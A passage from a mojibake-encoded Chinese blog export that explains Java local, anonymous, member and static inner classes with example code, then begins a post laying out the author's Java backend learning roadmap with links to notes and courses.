è®¿é—®æ–¹å¼ï¼šå¯ä»¥ç›´æ¥è®¿é—®å¤–éƒ¨ç±»çš„æ‰€æœ‰æˆå‘˜ï¼ŒåŒ…å«ç§æœ‰çš„\n- 4.å¤–éƒ¨ç±»è®¿å‘å±€éƒ¨å†…éƒ¨ç±»çš„æˆå‘˜\n  - è®¿é—®æ–¹å¼ï¼šåˆ›å»ºå±€éƒ¨å†…éƒ¨ç±»çš„å¯¹è±¡ï¼Œå†è®¿é—®(æ³¨æ„:å¿…é¡»åœ¨ä½œç”¨åŸŸå†…)\n\n- 5.å¤–éƒ¨å…¶ä»–ç±»ä¸èƒ½è®¿å‘å±€éƒ¨å†…éƒ¨ç±»(å› ä¸ºå±€éƒ¨å†…éƒ¨ç±»åœ°ä½æ˜¯ä¸€ä¸ªå±€éƒ¨å˜é‡)\n- 6.å¦‚æœå¤–éƒ¨ç±»å’Œå±€éƒ¨å†…éƒ¨ç±»çš„æˆå‘˜é‡åæ—¶\n  - é»˜è®¤éµå¾ªå°±è¿‘åŸåˆ™\n  - å¦‚æœæƒ³è®¿é—®å¤–éƒ¨ç±»çš„æˆå‘˜ï¼Œåˆ™å¯ä»¥ä½¿ç”¨(å¤–éƒ¨ç±»å.this.æˆå‘˜)å»è®¿é—®\n\n```java\npackage com.jwt.innerclass;\n\npublic class LocalInnerClass {\n    public static void main(String[] args) {\n        Outer outer = new Outer();\n        outer.m1();\n    }\n}\n\nclass Outer {//å¤–éƒ¨ç±»\n    private int n1 = 100;\n    private int n2 = 700;\n    //ç§æœ‰æ–¹æ³•\n    private void m2() {\n        System.out.println(\"å¤–éƒ¨ç±»çš„ç§æœ‰æ–¹æ³• m2()\");\n    }\n\n    //æ–¹æ³•\n    public void m1() {\n        //1.ä¸èƒ½æ·»åŠ è®¿é—®ä¿®é¥°ç¬¦,ä½†æ˜¯å¯ä»¥ä½¿ç”¨final ä¿®é¥°\n        //2.ä½œç”¨åŸŸ: ä»…ä»…åœ¨å®šä¹‰å®ƒçš„æ–¹æ³•æˆ–ä»£ç å—ä¸­\n        final class Inner {//å±€éƒ¨å†…éƒ¨ç±»\n            private int n1 = 800;//ä¸å¤–éƒ¨ç±»æˆå‘˜é‡å\n            public void f1() {\n                // 3.å¯ä»¥ç›´æ¥è®¿é—®å¤–éƒ¨ç±»çš„æ‰€æœ‰æˆå‘˜ï¼ŒåŒ…å«ç§æœ‰çš„\n                System.out.println(\"n2=\" + n2 );\n                m2();\n                //6. å¦‚æœå¤–éƒ¨ç±»å’Œå±€éƒ¨å†…éƒ¨ç±»çš„æˆå‘˜é‡åæ—¶ï¼Œ\n                //1)é»˜è®¤éµå¾ªå°±è¿‘åŸåˆ™ï¼Œ\n                System.out.println(\"n1=\" + n1 );\n                // 2)å¦‚æœæƒ³è®¿é—®å¤–éƒ¨ç±»çš„æˆå‘˜ï¼Œä½¿ç”¨ï¼ˆå¤–éƒ¨ç±»å.this.æˆå‘˜ï¼‰å»è®¿é—®\n                System.out.println(\"n1=\" + Outer.this.n1);\n            }\n        }\n        //4. å¤–éƒ¨ç±»è®¿å‘å±€éƒ¨å†…éƒ¨ç±»çš„æˆå‘˜ï¼Œåˆ›å»ºå±€éƒ¨å†…éƒ¨ç±»çš„å¯¹è±¡ï¼Œå†è®¿é—®\n        Inner inner = new Inner();\n        inner.f1();\n        System.out.println(\"å¤–éƒ¨ç±»è®¿é—®å±€éƒ¨å†…éƒ¨ç±»çš„n1=\" + inner.n1);\n    }\n}\n```\n\n#### åŒ¿åå†…éƒ¨ç±»\n\nåŒ¿åå†…éƒ¨ç±»æ˜¯å®šä¹‰åœ¨å¤–éƒ¨ç±»çš„å±€éƒ¨ä½ç½®(æ–¹æ³•ä¸­æˆ–è€…ä»£ç å—ä¸­)ï¼Œå¹¶ä¸”æ²¡æœ‰ç±»å\n\n- åŒ¿åå†…éƒ¨ç±»æœ¬è´¨æ˜¯ç±»\n- åŒæ—¶è¿˜æ˜¯ä¸€ä¸ªå¯¹è±¡\n\nåŒ¿åå†…éƒ¨ç±»çš„åŸºæœ¬è¯­æ³•\n\n```java\nnew ç±»æˆ–æ¥å£(å‚æ•°åˆ—è¡¨){\n\t\tç±»ä½“\n};\n```\n\nåŒ¿åå†…éƒ¨ç±»çš„è¯­æ³•æ¯”è¾ƒå¥‡ç‰¹ï¼Œ åŒ¿åå†…éƒ¨ç±»æ—¢æ˜¯ä¸€ä¸ªç±»çš„å®šä¹‰ï¼ŒåŒæ—¶å®ƒæœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå› æ­¤ä»è¯­æ³•ä¸Šçœ‹ï¼Œå®ƒæ—¢æœ‰å®šä¹‰ç±»çš„ç‰¹å¾ï¼Œä¹Ÿæœ‰åˆ›å»ºå¯¹è±¡çš„ç‰¹å¾\n\n- 1.ä¸èƒ½æ·»åŠ è®¿é—®ä¿®é¥°ç¬¦ï¼Œå› ä¸ºå®ƒçš„åœ°ä½å°±æ˜¯ä¸€ä¸ªå±€éƒ¨å˜é‡ã€‚\n- 2.ä½œç”¨åŸŸï¼šä»…ä»…åœ¨å®šä¹‰å®ƒçš„æ–¹æ³•æˆ–ä»£ç å—ä¸­ã€‚\n- 3.åŒ¿åå†…éƒ¨ç±»è®¿å‘å¤–éƒ¨ç±»æˆå‘˜\n  - è®¿é—®æ–¹å¼ï¼šå¯ä»¥ç›´æ¥è®¿é—®å¤–éƒ¨ç±»çš„æ‰€æœ‰æˆå‘˜ï¼ŒåŒ…å«ç§æœ‰çš„\n- 4.å¤–éƒ¨å…¶ä»–ç±»ä¸èƒ½è®¿åŒ¿åå†…éƒ¨ç±»(å› ä¸ºåŒ¿åå†…éƒ¨ç±»åœ°ä½æ˜¯ä¸€ä¸ªå±€éƒ¨å˜é‡)\n- 5.å¦‚æœå¤–éƒ¨ç±»å’ŒåŒ¿åå†…éƒ¨ç±»çš„æˆå‘˜é‡åæ—¶ï¼ŒåŒ¿åå†…éƒ¨ç±»è®¿é—®çš„è¯\n  - é»˜è®¤éµå¾ªå°±è¿‘åŸåˆ™\n  - å¦‚æœæƒ³è®¿é—®å¤–éƒ¨ç±»çš„æˆå‘˜ï¼Œåˆ™å¯ä»¥ä½¿ç”¨(å¤–éƒ¨ç±»å.this.æˆå‘˜) å»è®¿é—®\n  \n\n```java\npackage com.jwt.innerclass;\n\npublic class AnonymousInnerClass {\n    public static void main(String[] args) {\n        Outer05 outer05 = new Outer05();\n        outer05.f1();\n    }\n\n}\n\nclass Outer05 {\n    private int n1 = 100;\n    private int n2 = 700;\n\n    public void f1() {\n        //1.ä¸èƒ½æ·»åŠ è®¿é—®ä¿®é¥°ç¬¦\n        //2.ä½œç”¨åŸŸ: ä»…ä»…åœ¨å®šä¹‰å®ƒçš„æ–¹æ³•æˆ–ä»£ç å—ä¸­\n         Person p = new Person() {//åˆ›å»ºä¸€ä¸ªåŸºäºç±»çš„åŒ¿åå†…éƒ¨ç±»\n            private int n1 = 800;//ä¸å¤–éƒ¨ç±»æˆå‘˜é‡å\n            @Override\n            public void hi() {\n                //3.å¯ä»¥ç›´æ¥è®¿é—®å¤–éƒ¨ç±»çš„æ‰€æœ‰æˆå‘˜ï¼ŒåŒ…å«ç§æœ‰çš„\n                System.out.println(\"n2=\" + n2 );\n                //5.å¦‚æœå¤–éƒ¨ç±»å’ŒåŒ¿åå†…éƒ¨ç±»çš„æˆå‘˜é‡åæ—¶ï¼ŒåŒ¿åå†…éƒ¨ç±»è®¿é—®çš„è¯\n                //1)é»˜è®¤éµå¾ªå°±è¿‘åŸåˆ™\n                System.out.println(\"n1=\" + n1 );\n                //2)å¦‚æœæƒ³è®¿é—®å¤–éƒ¨ç±»çš„æˆå‘˜ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ï¼ˆå¤–éƒ¨ç±»å.this.æˆå‘˜ï¼‰å»è®¿é—®\n                System.out.println(\"n1=\" + Outer05.this.n1 );\n            }\n        };\n         p.hi();//åŠ¨æ€ç»‘å®š\n\n        //ä¹Ÿå¯ä»¥ç›´æ¥è°ƒç”¨, åŒ¿åå†…éƒ¨ç±»æœ¬èº«ä¹Ÿæ˜¯è¿”å›å¯¹è±¡\n         new Person(){\n             @Override\n             public void ok(String str) {\n                 super.ok(str);\n             }\n         }.ok(\"jack\");\n    }\n}\n\n\n\nclass Person {//ç±»\n    public void hi() {\n        System.out.println(\"Person hi()\");\n    }\n\n    public void ok(String str) {\n        System.out.println(\"Person ok() \" + str);\n    }\n}\n```\n\n**åŒ¿åå†…éƒ¨ç±»çš„æœ€ä½³å®è·µ**ï¼šå½“åšå®å‚ç›´æ¥ä¼ é€’ï¼Œç®€æ´é«˜æ•ˆ\n\n```java\npackage com.jwt.innerclass;\n\npublic class InnerClassExercise01 {\n    public static void main(String[] args) {\n        \n        //å½“åšå®å‚ç›´æ¥ä¼ é€’ï¼Œç®€æ´é«˜æ•ˆ\n        f1(new IL() {\n            @Override\n            public void show() {\n                System.out.println(\"è¿™æ˜¯ä¸€å‰¯åç”»~~...\");\n            }\n        });\n\n        //ä¼ ç»Ÿæ–¹æ³•\n        f1(new Picture());\n    }\n    //é™æ€æ–¹æ³•,å½¢å‚æ˜¯æ¥å£ç±»å‹\n    public static void f1(IL il) {\n        il.show();\n    }\n}\n\n//æ¥å£\ninterface IL {\n    void show();\n}\n\n//ç±»->å®ç°IL\nclass Picture implements IL {\n    @Override\n    public void show() {\n        System.out.println(\"è¿™æ˜¯ä¸€å‰¯åç”»XX...\");\n    }\n}\n```\n\nç»ƒä¹ ï¼š\n\n1.æœ‰ä¸€ä¸ªé“ƒå£°æ¥å£ Bellï¼Œé‡Œé¢æœ‰ä¸ª ring æ–¹æ³•ã€‚\n2.æœ‰ä¸€ä¸ªæ‰‹æœºç±» Cellphone, å…·æœ‰é—¹é’ŸåŠŸèƒ½ alarmclockï¼Œå‚æ•°æ˜¯ Bell ç±»å‹\n3.æµ‹è¯•æ‰‹æœºç±»çš„é—¹é’ŸåŠŸèƒ½ï¼Œé€šè¿‡åŒ¿åå†…éƒ¨ç±»(å¯¹è±¡)ä½œä¸ºå‚æ•°ï¼Œæ‰“å°:æ‡’çŒªèµ·åºŠäº†\n4.å†ä¼ å…¥å¦ä¸€ä¸ªåŒ¿åå†…éƒ¨ç±»(å¯¹è±¡)ï¼Œæ‰“å°:å°ä¼™ä¼´ä¸Šè¯¾äº†\n\n```java\npackage com.jwt.innerclass;\n\npublic class InnerClassExercise02 {\n    public static void main(String[] args) {\n        Cellphone cellphone = new Cellphone();\n        cellphone.alarmclock(new Bell() {\n            @Override\n            public void ring() {\n                System.out.println(\"æ‡’çŒªèµ·åºŠäº†\");\n            }\n        });\n        cellphone.alarmclock(new Bell() {\n            @Override\n            public void ring() {\n                System.out.println(\"å°ä¼™ä¼´ä¸Šè¯¾äº†\");\n            }\n        });\n    }\n}\n\ninterface Bell{\n    void ring();\n}\n\nclass Cellphone {\n    public void alarmclock(Bell bell){\n        System.out.println(bell.getClass());\n        bell.ring();//åŠ¨æ€ç»‘å®š\n    }\n}\n```\n\n#### æˆå‘˜å†…éƒ¨ç±»\n\næˆå‘˜å†…éƒ¨ç±»æ˜¯å®šä¹‰åœ¨å¤–éƒ¨ç±»çš„æˆå‘˜ä½ç½®ï¼Œå¹¶ä¸”æ²¡æœ‰ static ä¿®é¥°ã€‚\n\n- 1.å¯ä»¥æ·»åŠ ä»»æ„è®¿é—®ä¿®é¥°ç¬¦(publicã€protected ã€é»˜è®¤ã€private)ï¼Œå› ä¸ºå®ƒçš„åœ°ä½å°±æ˜¯ä¸€ä¸ªæˆå‘˜ã€‚\n- 2.ä½œç”¨åŸŸï¼šå’Œå¤–éƒ¨ç±»çš„å…¶ä»–æˆå‘˜ä¸€æ ·ï¼Œä¸ºæ•´ä¸ªç±»ä½“ \n- 3.æˆå‘˜å†…éƒ¨ç±»è®¿å‘å¤–éƒ¨ç±»æˆå‘˜(æ¯”å¦‚:å±æ€§) \n  - è®¿é—®æ–¹å¼ï¼šå¯ä»¥ç›´æ¥è®¿é—®å¤–éƒ¨ç±»çš„æ‰€æœ‰æˆå‘˜ï¼ŒåŒ…å«ç§æœ‰çš„\n- 4.å¤–éƒ¨ç±»è®¿é—®æˆå‘˜å†…éƒ¨ç±»\n  - è®¿é—®æ–¹å¼ï¼šåˆ›å»ºå¯¹è±¡ï¼Œ å†è®¿é—®\n- 5.å¤–éƒ¨å…¶ä»–ç±»è®¿é—®æˆå‘˜å†…éƒ¨ç±»\n\n```java\n//æ–¹å¼ä¸€ï¼šå¤–éƒ¨ç±»å.æˆå‘˜å†…éƒ¨ç±»å å¯¹è±¡å = å¤–éƒ¨ç±»å.new æˆå‘˜å†…éƒ¨ç±»å()\nOuter.Inner inner = Outer.new Inner()\n  \n//æ–¹å¼äºŒ:åœ¨å¤–éƒ¨ç±»ä¸­ç¼–å†™ä¸€ä¸ªæ–¹æ³•ï¼Œè¿”å›æˆå‘˜å†…éƒ¨ç±»å¯¹è±¡\npublic class Inner{\n  ...\n    public Inner getInnerInstance(){\n    \t\treturn new Inner();\n  }\n}\nOuter outer = new Outer()\nouter.getInnerInstance()\n```\n\n- 6.å¦‚æœå¤–éƒ¨ç±»å’Œå†…éƒ¨ç±»çš„æˆå‘˜é‡åæ—¶ï¼Œ å†…éƒ¨ç±»è®¿é—®çš„è¯\n  - é»˜è®¤éµå¾ªå°±è¿‘åŸåˆ™\n  - å¦‚æœæƒ³è®¿é—®å¤–éƒ¨ç±»çš„æˆå‘˜ï¼Œåˆ™å¯ä»¥ä½¿ç”¨(å¤–éƒ¨ç±»å.this.æˆå‘˜)å»è®¿é—®\n\n#### é™æ€å†…éƒ¨ç±»\n\né™æ€å†…éƒ¨ç±»æ˜¯å®šä¹‰åœ¨å¤–éƒ¨ç±»çš„æˆå‘˜ä½ç½®ï¼Œå¹¶ä¸”æœ‰ static ä¿®é¥°ã€‚\n\n- 1.å¯ä»¥æ·»åŠ ä»»æ„è®¿é—®ä¿®é¥°ç¬¦(publicã€ protectedã€ é»˜è®¤ã€private),å› ä¸ºå®ƒçš„åœ°ä½å°±æ˜¯ä¸€ä¸ªæˆå‘˜ã€‚\n- 2.ä½œç”¨åŸŸï¼šåŒå…¶ä»–çš„æˆå‘˜ï¼Œä¸ºæ•´ä¸ªç±»ä½“\n- 3.é™æ€å†…éƒ¨ç±»è®¿é—®å¤–éƒ¨ç±»(æ¯”å¦‚:é™æ€å±æ€§) \n  - è®¿é—®æ–¹å¼ï¼šå¯ä»¥ç›´æ¥è®¿é—®å¤–éƒ¨ç±»çš„æ‰€æœ‰é™æ€æˆå‘˜ï¼ŒåŒ…å«ç§æœ‰çš„ï¼Œä½†ä¸èƒ½ç›´æ¥è®¿é—®éé™æ€æˆå‘˜\n- 4.å¤–éƒ¨ç±»è®¿é—®é™æ€å†…éƒ¨ç±»\n  - è®¿é—®æ–¹å¼ï¼šåˆ›å»ºå¯¹è±¡ï¼Œå†è®¿é—®\n- 5.å¤–éƒ¨å…¶ä»–ç±»è®¿é—®é™æ€å†…éƒ¨ç±»\n\n```java\n//æ–¹å¼ä¸€ï¼šå¤–éƒ¨ç±»å.æˆå‘˜å†…éƒ¨ç±»å å¯¹è±¡å = å¤–éƒ¨ç±»å.new æˆå‘˜å†…éƒ¨ç±»å()\nOuter.Inner inner = new Outer.Inner()\n  \n  \n//æ–¹å¼äºŒ:åœ¨å¤–éƒ¨ç±»ä¸­ç¼–å†™ä¸€ä¸ªæ–¹æ³•ï¼Œè¿”å›æˆå‘˜å†…éƒ¨ç±»å¯¹è±¡\nstatic class Inner{\n    ...\n      \n    public Inner getInnerInstance(){\n    \t\treturn new Inner();\n  }\n}\nOuter outer = new Outer()\nouter.getInnerInstance()  \n//æˆ–è€…\nOuter.getInnerInstance()  \n```\n\n- 6.å¦‚æœå¤–éƒ¨ç±»å’Œé™æ€å†…éƒ¨ç±»çš„æˆå‘˜é‡åæ—¶ï¼Œé™æ€å†…éƒ¨ç±»è®¿é—®çš„æ—¶ï¼Œ\n  - é»˜è®¤éµå¾ªå°±è¿‘åŸåˆ™\n  - å¦‚æœæƒ³è®¿é—®å¤–éƒ¨ç±»çš„æˆå‘˜ï¼Œåˆ™å¯ä»¥ä½¿ç”¨(å¤–éƒ¨ç±»å.æˆå‘˜) å»è®¿é—®\n\n## â¤ï¸Sponsor\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ°å·§è´¢åŠ›é›„åšï¼Œåˆæ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["å¯¹è±¡"],"categories":["JavaSE"]},{"title":"Java-å­¦ä¹ è·¯çº¿","url":"/posts/29829.html","content":"\nå“ˆå–½ï¼Œå¤§å®¶å¥½å‘€ï¼å®‰å…¨å‡ºèº«çš„å°ç®€åšå‡ºäº†äººç”Ÿä¸­åˆä¸€é‡å¤§çš„å†³å®šï¼Œé‚£å°±æ˜¯ä»å®‰å…¨æ–¹å‘é€æ¸è½¬ä¸ºå¼€å‘æ–¹å‘ï¼Œå°ç®€è‡ªå·±ä¹Ÿçº ç»“äº†å¾ˆä¹…ï¼Œå°½ç®¡çŸ¥é“è¿™æ ·ä¼šå¾ˆéš¾ï¼Œä½†æœ€ç»ˆè¿˜æ˜¯åšä¸‹äº†è¿™ä¸ªå†³å®šï¼Œè‡³äºåŸå› å˜›ï¼Œåº”è¯¥æ˜¯æˆ‘å¯¹å¼€å‘æ›´æœ‰å…´è¶£ä¸€äº›ï¼Œä¹Ÿæƒ³å»å°è¯•ä¸€äº›æ–°çš„ä¸œè¥¿ï¼Œå½“ç„¶æˆ‘ä¹Ÿä¸æ˜¯å®Œå…¨æ”¾å¼ƒå®‰å…¨ï¼Œåªæ˜¯è¿‘ä¸€å¹´å·¦å³æ—¶é—´æˆ‘ä¼šå°†é‡å¿ƒæ”¾åœ¨å¼€å‘æ–¹å‘(å½“ç„¶æ˜¯åˆ©ç”¨è¯¾ä½™æ—¶é—´ï¼Œå°ç®€çš„ä¸»ä¸šè¿˜æ˜¯ä¸€åç ”ç©¶ç”Ÿï¼Œå¹³æ—¶éœ€è¦å®Œæˆè€å¸ˆç»™çš„ç§‘ç ”ä»»åŠ¡)ï¼Œæ¥ä¸‹æ¥å°ç®€å°†åšä¸€ä¸ª â€œJava ä» 0 åˆ° 1â€ çš„å®éªŒï¼Œä»¥è‡ªå·±ä¸ºå®éªŒå¯¹è±¡ï¼Œä»é›¶å¼€å§‹å­¦ä¹ Javaï¼Œä¸‹æ–¹æ˜¯å°ç®€å‚è€ƒç½‘ä¸Šèµ„æ–™ã€è¯·æ•™å‰è¾ˆæ•´ç†å‡ºæ¥çš„ Java å­¦ä¹ è·¯çº¿ï¼Œç›®å‰è¿˜ä¸å®Œå–„ï¼Œä¼šåœ¨å­¦ä¹ çš„è¿‡ç¨‹ä¸­æŒç»­ä¸æ–­çš„æ›´æ–°ï¼æˆ‘å°†æŒ‰ç…§æ•´ç†çš„è·¯çº¿ä» 0 å¼€å§‹å­¦ Java åç«¯çš„çŸ¥è¯†ï¼Œå¹¶ä¸å®šæœŸæ›´æ–°æ‰€å­¦ç¬”è®°ï¼ŒæœŸå¾…ä¸€å¹´åçš„èœ•å˜å§ï¼<æœ‰åŒæ ·æƒ³æ³•çš„å°ä¼™ä¼´ï¼Œå¯ä»¥è”ç³»æˆ‘ä¸€èµ·äº¤æµå­¦ä¹ å“¦ï¼>\n\n| <center>Notations</center> | <center>explanation</center> |\n| :------------------------- | :--------------------------: |\n| <center>âœ…</center>         |  <center>ä»£è¡¨å·²å­¦</center>   |\n| <center>â˜‘ï¸</center>         |  <center>ä»£è¡¨æœªå­¦</center>   |\n| <center>ğŸ“Œ</center>         | <center>ä»£è¡¨æ­£åœ¨å­¦</center>  |\n| <center>ğŸ”„</center>         | <center>ä»£è¡¨éœ€å¤ä¹ </center>  |\n\n## JavaSE\n\n> **å¿…çŸ¥å¿…ä¼š** \n\n| åç§°     | çŠ¶æ€ | ç¬”è®°[æ±‡æ€»](https://jwt1399.top/categories/JavaSE/)           |\n| -------- | ---- | ------------------------------------------------------------ |\n| é¢å‘å¯¹è±¡ | âœ…    | [Java-é¢å‘å¯¹è±¡ \\|  ç®€ç®€](https://jwt1399.top/posts/64598.html) |\n| æšä¸¾     | âœ…    | [Java-æšä¸¾ \\| ç®€ç®€](https://jwt1399.top/posts/9855.html#toc-heading-7) |\n| æ³¨è§£     | âœ…    | [Java-æ³¨è§£ \\| ç®€ç®€](https://jwt1399.top/posts/9855.html#toc-heading-15) |\n| å¸¸ç”¨ç±»   | âœ…    | [Java-å¸¸ç”¨ç±» \\| ç®€ç®€](https://jwt1399.top/posts/33453.html)  |\n| é›†åˆ     | âœ…    | [Java-é›†åˆ \\| ç®€ç®€](https://jwt1399.top/posts/6773.html)     |\n| å¼‚å¸¸     | âœ…    | [Java-å¼‚å¸¸ \\| ç®€ç®€](https://jwt1399.top/posts/9855.html#toc-heading-16) |\n| æ³›å‹     | âœ…    | [Java-æ³›å‹ \\| ç®€ç®€](https://jwt1399.top/posts/9855.html#toc-heading-28) |\n| çº¿ç¨‹     | âœ…    | [Java-çº¿ç¨‹ \\| ç®€ç®€](https://jwt1399.top/posts/18034.html)    |\n| IOæµ     | âœ…    | [Java-IOæµ \\| ç®€ç®€](https://jwt1399.top/posts/52970.html)    |\n| ç½‘ç»œç¼–ç¨‹ | âœ…    | [Java-ç½‘ç»œç¼–ç¨‹ \\| ç®€ç®€](https://jwt1399.top/posts/43348.html) |\n| JDBC     | âœ…    | [Java-JDBC \\| ç®€ç®€](https://jwt1399.top/posts/146.html)      |\n| 8æ–°ç‰¹æ€§  | âœ…    | [Java 8 æ–°ç‰¹æ€§ \\| ç®€ç®€](https://jwt1399.top/posts/58320.html) |\n| åå°„     | âœ…    | [Java-åå°„ \\| ç®€ç®€](https://jwt1399.top/posts/13406.html)    |\n| æ­£åˆ™     | ğŸ”„    |                                                              |\n| æ±‡æ€»ç¯‡   | âœ…    | [JavaSE-æ±‡æ€» \\| ç®€ç®€ (jwt1399.top)](https://jwt1399.top/posts/9855.html) |\n\n> **å­¦ä¹ èµ„æº**\n\n- [éŸ©é¡ºå¹³-é›¶åŸºç¡€30å¤©å­¦ä¼šJava](https://www.bilibili.com/video/BV1fh411y7R8)\n- [å°šç¡…è°· Java8 æ–°ç‰¹æ€§æ•™ç¨‹](https://www.bilibili.com/video/BV14W411u7Ly)\n\n## JavaWeb\n\n> å¿…çŸ¥å¿…ä¼š\n\n| åç§°              | çŠ¶æ€ | ç¬”è®°[æ±‡æ€»](https://jwt1399.top/categories/JavaWeb/)          |\n| ----------------- | ---- | ------------------------------------------------------------ |\n| HTMLã€CSSã€JS     | âœ…    | [å‰ç«¯ä¸‰å‰‘å®¢ \\| ç®€ç®€ (jwt1399.top)](https://jwt1399.top/posts/38162.html) |\n| Tomcat            | âœ…    | [Tomcat \\| ç®€ç®€ (jwt1399.top)](https://jwt1399.top/posts/4688.html#toc-heading-3) |\n| Servlet           | âœ…    | [Servlet \\| ç®€ç®€ (jwt1399.top)](https://jwt1399.top/posts/55715.html) |\n| Cookie & Session  | âœ…    | [Cookie & Session \\| ç®€ç®€ (jwt1399.top)](https://jwt1399.top/posts/37985.html) |\n| filter & Listener | âœ…    | [filter & Listener \\|ç®€ç®€ (jwt1399.top)](https://jwt1399.top/posts/4688.html#toc-heading-6) |\n| JSPï¼ˆå¯ä¸å­¦ï¼‰     | âœ…    | [JSPå­¦ä¹ ç¬”è®° \\| ç®€ç®€ (jwt1399.top)](https://jwt1399.top/posts/59789.html) |\n| Thymeleaf         | âœ…    | [Thymeleaf \\|ç®€ç®€ (jwt1399.top)](https://jwt1399.top/posts/4688.html#toc-heading-12) |\n| Ajaxã€ Axios      | âœ…    | [Ajax & Axios  \\| ç®€ç®€ (jwt1399.top)](https://jwt1399.top/posts/16553.html) |\n| Vueã€Element UI   | âœ…    | [Vue & Element \\| ç®€ç®€ (jwt1399.top)](https://jwt1399.top/posts/28587.html) |\n\n## å¼€å‘æ¡†æ¶\n\n> **å¿…çŸ¥å¿…ä¼š**\n\n| åç§°                | çŠ¶æ€ | ç¬”è®°[æ±‡æ€»](http://localhost:4000/categories/Spring/)         |\n| ------------------- | ---- | ------------------------------------------------------------ |\n| Spring              | âœ…    | [Spring \\| ç®€ç®€ (jwt1399.top)](https://jwt1399.top/categories/Spring/) |\n| SpringMVC           | âœ…    | [SpringMVC  \\| ç®€ç®€ (jwt1399.top)](https://jwt1399.top/posts/4780.html) |\n| Mybatis             | âœ…    | [Mybatis \\| ç®€ç®€ (jwt1399.top)](https://jwt1399.top/posts/13919.html) |\n| Mybatis plus        | âœ…    | [MyBatis-Plus  ç®€ç®€ (jwt1399.top)](https://jwt1399.top/posts/11146.html) |\n| SSMæ•´åˆ             | âœ…    | [SSMæ•´åˆ \\| ç®€ç®€ (jwt1399.top)](https://jwt1399.top/posts/42096.html) |\n| SpringBootåŸºç¡€ç¯‡    | âœ…    | [SpringBoot-åŸºç¡€ç¯‡ \\| ç®€ç®€ (jwt1399.top)](https://jwt1399.top/posts/33757.html) |\n| SpringBootå®ç”¨ç¯‡    | âœ…    | [SpringBoot-å®ç”¨ç¯‡ \\|ç®€ç®€ (jwt1399.top)](https://jwt1399.top/posts/37881.html) |\n| SpringBootæ•´åˆç¯‡    | ğŸ“Œ    | [SpringBoot-æ•´åˆç¯‡ \\|ç®€ç®€](https://jwt1399.top/posts/58591.html) |\n| SpringBootåŸç†ç¯‡    | âœ…    | [SpringBoot-åŸç†ç¯‡ \\|ç®€ç®€](http://localhost:4000/posts/41747.html) |\n| SpringBooté¡¹ç›®ç¯‡    | â˜‘ï¸    |                                                              |\n| Springå…¨å®¶æ¡¶-é¢è¯•ç¯‡ | â˜‘ï¸    |                                                              |\n\n> **å­¦ä¹ èµ„æº**\n\n- [å°šç¡…è°·Springæ¡†æ¶è§†é¢‘æ•™ç¨‹](https://www.bilibili.com/video/BV1Vf4y127N5)\n- [å°šç¡…è°·SpringMVCæ•™ç¨‹](https://www.bilibili.com/video/BV1Ry4y1574R/)\n- [å°šç¡…è°·2022ç‰ˆMyBatisæ•™ç¨‹](https://www.bilibili.com/video/BV1VP4y1c7j7)\n- [å°šç¡…è°·2022ç‰ˆMyBatisPlusæ•™ç¨‹](https://www.bilibili.com/video/BV12R4y157Be)\n- [é»‘é©¬ç¨‹åºå‘˜SpringBoot2å…¨å¥—è§†é¢‘æ•™ç¨‹](https://www.bilibili.com/video/BV15b4y1a7yG?vd_source=fa98a6d1417d05689c64bc1449966321)\n\n## æ•°æ®åº“\n\n> **å¿…çŸ¥å¿…ä¼š**\n\n| åç§°          | çŠ¶æ€ | ç¬”è®°                                                         |\n| ------------- | ---- | ------------------------------------------------------------ |\n| MySQL         | âœ…    | [MySQL-å­¦ä¹ ç¬”è®° \\|ç®€ç®€ (jwt1399.top)](https://jwt1399.top/posts/27695.html) |\n| Redis         | âœ…    | [Redis \\|ç®€ç®€ (jwt1399.top)](https://jwt1399.top/posts/27273.html) |\n| ElasticSearch | â˜‘ï¸    |                                                              |\n| MySQLä¼˜åŒ–     | â˜‘ï¸    |                                                              |\n\n> **å­¦ä¹ èµ„æº**\n\n- ã€ŠMySQL å¿…çŸ¥å¿…ä¼šã€‹\n- ã€Šé«˜æ€§èƒ½ MySQLã€‹\n- ã€ŠMySQL æŠ€æœ¯å†…å¹•ã€‹\n- ã€ŠRedis è®¾è®¡ä¸å®ç°ã€‹\n\n## å¾®æœåŠ¡\n\n> **å¿…çŸ¥å¿…ä¼š**\n\n- Spring CloudğŸ“Œ\n\n  - æ³¨å†Œ/å‘ç°ï¼šEurekaâœ…ã€Nacosâœ…ã€Zookeeperâ˜‘ï¸\n\n  - æœåŠ¡è°ƒç”¨ï¼šRestTemplateâœ…ã€OpenFeignâœ…ã€Dubboâ˜‘ï¸\n  - æœåŠ¡é…ç½®ï¼šNacosâœ…\n  - æœåŠ¡ç½‘å…³ï¼šGetawayâœ…\n  - è´Ÿè½½å‡è¡¡ï¼šRibbonâœ…\n  - æ¶ˆæ¯é˜Ÿåˆ—ï¼šRabbitMQâœ…ã€RabbitMQâ˜‘ï¸ã€kafkaâ˜‘ï¸\n  - æœåŠ¡ä¿æŠ¤ï¼šSentinelâœ…\n  - äº‹åŠ¡ï¼šSeataâœ…\n  - è®¤è¯é‰´æƒï¼šSpring Securityâ˜‘ï¸ã€Oauth2â˜‘ï¸ã€shiroâ˜‘ï¸\n\nOther\n\n- Nettyâ˜‘ï¸\n\n> å­¦ä¹ èµ„æº\n\n- 